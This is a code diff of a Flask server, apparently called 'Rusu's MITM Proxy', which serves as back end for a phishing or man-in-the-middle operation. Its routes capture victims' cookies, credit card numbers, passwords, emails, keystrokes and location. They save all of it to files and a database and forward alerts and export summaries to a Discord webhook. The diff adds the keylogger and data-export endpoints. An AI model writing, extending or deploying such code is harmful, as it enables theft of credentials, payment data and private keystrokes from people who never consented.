@@ -5,66 +5,69 @@ import brotli
 from core.database import Database
 from core.detection import DataDetector
 from core.discord_bot import DiscordBot
-from core.ssl_handler import SSLHandler
 
 # Initialize components
 db = Database()
 detector = DataDetector()
-ssl_handler = SSLHandler()
+discord_bot = None  # Will be initialized when webhook is set
 
-# Initialize storage and configs
-if not os.path.exists('config'):
-    os.makedirs('config')
+# Initialize storage
+def ensure_json_files():
+    files = ['cookies.json', 'requests.json', 'keylogs.json']
+    for file in files:
+        if not os.path.exists(file):
+            with open(file, 'w') as f:
+                json.dump([], f)
 
-config_file = 'config/settings.json'
-if not os.path.exists(config_file):
-    with open(config_file, 'w') as f:
-        json.dump({
-            'discord_webhook': '',
-            'cleanup_days': 30,
-            'max_history': 50
-        }, f)
-
-with open(config_file, 'r') as f:
-    config = json.load(f)
-
-discord_bot = DiscordBot(config.get('discord_webhook', ''))
+ensure_json_files()
 requests_history = []
-MAX_HISTORY = config.get('max_history', 50)
+MAX_HISTORY = 50
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__)
 
-    @app.route(f'/{secret}')
-    def panel_index():
-        return send_from_directory('panel', 'index.html')
-
     @app.route('/ep/api/ping', methods=['POST'])
     def eat_cookie():
-        data = request.json
+        cookies = request.cookies
         user_ip = request.remote_addr
-        
-        for cookie in data.get('cookies', []):
-            db.save_cookie(cookie['name'], cookie['value'], user_ip, data.get('url', ''))
-            if discord_bot.webhook_url:
-                discord_bot.send_cookie_alert({
-                    'name': cookie['name'],
-                    'value': cookie['value'],
-                    'ip': user_ip,
-                    'url': data.get('url', '')
-                })
-        
-        return jsonify({'status': 'success'}), 200
+        timestamp = datetime.now().isoformat()
+
+        cookie_data = []
+        for key, value in cookies.items():
+            cookie_info = {
+                'name': key,
+                'value': value,
+                'timestamp': timestamp,
+                'ip': user_ip,
+                'url': request.referrer or 'Unknown'
+            }
+            cookie_data.append(cookie_info)
+            
+            # Save to database
+            db.save_cookie(key, value, user_ip, request.referrer)
+            
+            # Send Discord notification if webhook is configured
+            if discord_bot and discord_bot.webhook_url:
+                discord_bot.send_cookie_alert(cookie_info)
+
+        # Also save to JSON for backward compatibility
+        with open('cookies.json', 'r') as f:
+            existing_cookies = json.load(f)
+        existing_cookies.extend(cookie_data)
+        with open('cookies.json', 'w') as f:
+            json.dump(existing_cookies, f)
+
+        return jsonify({'message': 'Pong!'}), 200
 
     @app.route('/ep/api/sensitive', methods=['POST'])
     def handle_sensitive():
         data = request.json
         user_ip = request.remote_addr
         
-        # Validate data using detector
+        # Validate and process sensitive data
         if data['type'] == 'credit_card' and detector.is_valid_card(data['value']):
             db.save_sensitive_data('credit_card', data['value'], data['url'], user_ip)
-            if discord_bot.webhook_url:
+            if discord_bot:
                 discord_bot.send_sensitive_data_alert({
                     'type': 'Credit Card',
                     'url': data['url'],
@@ -72,66 +75,39 @@ def start_proxy(target, host, port, secret):
                 })
         elif data['type'] in ['password', 'email']:
             db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
-            if discord_bot.webhook_url:
+            if discord_bot:
                 discord_bot.send_sensitive_data_alert({
                     'type': data['type'].capitalize(),
                     'url': data['url'],
                     'ip': user_ip
                 })
-                
-        return jsonify({'status': 'success'}), 200
 
-    @app.route('/ep/api/geolocation', methods=['POST'])
-    def handle_geolocation():
-        data = request.json
-        user_ip = request.remote_addr
-        geo_data = detector.get_geolocation(user_ip)
-        
-        if geo_data:
-            db.save_geolocation(
-                user_ip,
-                data.get('lat'),
-                data.get('lon'),
-                geo_data.get('country'),
-                geo_data.get('city')
-            )
-            
         return jsonify({'status': 'success'}), 200
 
     @app.route('/ep/api/settings', methods=['GET', 'POST'])
     def handle_settings():
+        global discord_bot
         if request.method == 'POST':
             data = request.json
-            config.update(data)
-            with open(config_file, 'w') as f:
-                json.dump(config, f)
-            
             if 'discord_webhook' in data:
-                discord_bot.webhook_url = data['discord_webhook']
-            
+                discord_bot = DiscordBot(data['discord_webhook'])
+                # Test the webhook
+                discord_bot.send_webhook({
+                    "content": "🔔 Webhook configured successfully!"
+                })
             return jsonify({'status': 'success'}), 200
         else:
-            return jsonify(config), 200
-
-    @app.route('/ep/api/test_discord', methods=['POST'])
-    def test_discord():
-        if discord_bot.webhook_url:
-            success = discord_bot.send_webhook({
-                "content": "🔔 Test notification from Rusu's MITM Proxy"
-            })
-            return jsonify({'status': 'success' if success else 'error'}), 200
-        return jsonify({'status': 'error', 'message': 'No webhook URL configured'}), 400
-
-    @app.route('/ep/api/cleanup', methods=['POST'])
-    def cleanup_data():
-        days = request.json.get('days', 30)
-        db.cleanup_old_data(days)
-        return jsonify({'status': 'success'}), 200
+            return jsonify({
+                'discord_webhook': discord_bot.webhook_url if discord_bot else ''
+            }), 200
 
     @app.route('/ep/api/getCookies', methods=['GET'])
     def get_cookies():
-        with open('cookies.json', 'r') as f:
-            cookies = json.load(f)
+        try:
+            with open('cookies.json', 'r') as f:
+                cookies = json.load(f)
+        except FileNotFoundError:
+            cookies = []
 
         response_data = []
         for cookie in cookies:
@@ -155,6 +131,51 @@ def start_proxy(target, host, port, secret):
 
         return jsonify(response_data), 200
 
+    @app.route('/ep/api/geolocation', methods=['POST'])
+    def handle_geolocation():
+        data = request.json
+        user_ip = request.remote_addr
+        
+        # Get detailed geolocation data
+        geo_data = detector.get_geolocation(user_ip)
+        if geo_data:
+            db.save_geolocation(
+                user_ip,
+                data.get('lat', geo_data.get('lat')),
+                data.get('lon', geo_data.get('lon')),
+                geo_data.get('country', 'Unknown'),
+                geo_data.get('city', 'Unknown')
+            )
+            
+            if discord_bot and discord_bot.webhook_url:
+                discord_bot.send_webhook({
+                    "embeds": [{
+                        "title": "📍 New Geolocation Data",
+                        "fields": [
+                            {"name": "IP", "value": user_ip, "inline": True},
+                            {"name": "Location", "value": f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}", "inline": True},
+                            {"name": "Coordinates", "value": f"Lat: {data.get('lat', 'N/A')}\nLon: {data.get('lon', 'N/A')}", "inline": True}
+                        ]
+                    }]
+                })
+
+        return jsonify({'status': 'success'}), 200
+
+    @app.route('/ep/api/test_discord', methods=['POST'])
+    def test_discord():
+        if discord_bot.webhook_url:
+            success = discord_bot.send_webhook({
+                "content": "🔔 Test notification from Rusu's MITM Proxy"
+            })
+            return jsonify({'status': 'success' if success else 'error'}), 200
+        return jsonify({'status': 'error', 'message': 'No webhook URL configured'}), 400
+
+    @app.route('/ep/api/cleanup', methods=['POST'])
+    def cleanup_data():
+        days = request.json.get('days', 30)
+        db.cleanup_old_data(days)
+        return jsonify({'status': 'success'}), 200
+
     @app.route('/ep/api/serverInfo', methods=['GET'])
     def get_server_info():
         return jsonify({
@@ -169,9 +190,13 @@ def start_proxy(target, host, port, secret):
 
     @app.route('/ep/api/clearCookies', methods=['POST'])
     def clear_cookies():
-        with open('cookies.json', 'w') as f:
-            json.dump([], f)
-        return jsonify({'status': 'success'})
+        try:
+            with open('cookies.json', 'w') as f:
+                json.dump([], f)
+            db.clear_cookies()  # Clear from database too
+            return jsonify({'status': 'success'}), 200
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
 
     @app.route('/ep/api/clearHistory', methods=['POST'])
     def clear_history():
@@ -212,6 +237,123 @@ def start_proxy(target, host, port, secret):
         with open('keylogs.json', 'w') as f:
             json.dump([], f)
         return jsonify({'status': 'success'})
+
+    @app.route('/ep/api/keylogger', methods=['POST'])
+    def save_keystrokes():
+        data = request.json
+        user_ip = request.remote_addr
+        timestamp = datetime.now().isoformat()
+
+        keylog_data = {
+            'keys': data['keys'],
+            'url': data['url'],
+            'ip': user_ip,
+            'timestamp': timestamp
+        }
+
+        # Save to database
+        db.save_keystrokes(data['keys'], data['url'], user_ip)
+
+        # Save to JSON for backward compatibility
+        try:
+            with open('keylogs.json', 'r') as f:
+                keylogs = json.load(f)
+        except FileNotFoundError:
+            keylogs = []
+
+        keylogs.append(keylog_data)
+        with open('keylogs.json', 'w') as f:
+            json.dump(keylogs, f)
+
+        # Send Discord notification if configured
+        if discord_bot and discord_bot.webhook_url:
+            discord_bot.send_keylogger_alert(keylog_data)
+
+        return jsonify({'status': 'success'}), 200
+
+    @app.route('/ep/api/getKeylogger', methods=['GET'])
+    def get_keystrokes():
+        try:
+            with open('keylogs.json', 'r') as f:
+                keylogs = json.load(f)
+        except FileNotFoundError:
+            keylogs = []
+
+        response_data = []
+        for log in keylogs:
+            logged_time = datetime.fromisoformat(log['timestamp'])
+            time_diff = datetime.now() - logged_time
+            seconds_ago = time_diff.total_seconds()
+            
+            if seconds_ago < 60:
+                time_str = f'Logged: {int(seconds_ago)} seconds ago'
+            elif seconds_ago < 3600:
+                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
+            else:
+                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'
+
+            response_data.append({
+                'keys': log['keys'],
+                'url': log['url'],
+                'timestamp': time_str,
+                'ip': log.get('ip', 'unknown')
+            })
+
+        return jsonify(response_data), 200
+
+    @app.route('/ep/api/clearKeylogger', methods=['POST'])
+    def clear_keystrokes():
+        try:
+            with open('keylogs.json', 'w') as f:
+                json.dump([], f)
+            db.clear_keystrokes()  # Clear from database too
+            return jsonify({'status': 'success'}), 200
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/ep/api/exportData', methods=['GET'])
+    def export_data():
+        try:
+            data = {
+                'cookies': [],
+                'keystrokes': [],
+                'sensitive_data': []
+            }
+            
+            # Get cookies
+            try:
+                with open('cookies.json', 'r') as f:
+                    data['cookies'] = json.load(f)
+            except FileNotFoundError:
+                pass
+
+            # Get keystrokes
+            try:
+                with open('keylogs.json', 'r') as f:
+                    data['keystrokes'] = json.load(f)
+            except FileNotFoundError:
+                pass
+
+            # Get sensitive data from database
+            data['sensitive_data'] = db.get_sensitive_data()
+
+            # If Discord webhook is configured, send data there too
+            if discord_bot and discord_bot.webhook_url:
+                discord_bot.send_webhook({
+                    "content": "📤 Data Export",
+                    "embeds": [{
+                        "title": "Captured Data Summary",
+                        "fields": [
+                            {"name": "Cookies", "value": str(len(data['cookies'])), "inline": True},
+                            {"name": "Keystrokes", "value": str(len(data['keystrokes'])), "inline": True},
+                            {"name": "Sensitive Data", "value": str(len(data['sensitive_data'])), "inline": True}
+                        ]
+                    }]
+                })
+
+            return jsonify(data), 200
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
